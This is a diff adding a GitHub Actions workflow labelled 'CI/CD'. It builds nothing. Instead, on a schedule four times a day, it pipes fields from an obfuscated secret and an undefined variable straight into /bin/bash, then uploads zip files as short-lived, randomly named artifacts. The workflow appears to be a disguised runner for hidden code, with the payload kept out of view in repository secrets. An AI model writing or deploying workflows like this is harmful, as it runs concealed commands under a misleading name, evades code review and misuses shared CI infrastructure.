@@ -1,0 +1,27 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '19 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          rny36: ${{ secrets.rny36 }}
+        run: |
+          printf '%s' "$rny36" | jq -r .wz5207 | /bin/bash
+          echo $wn042 | jq -r .dsbh82222 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4Vht8xWq
+          path: "*.zip"
+          retention-days: 1
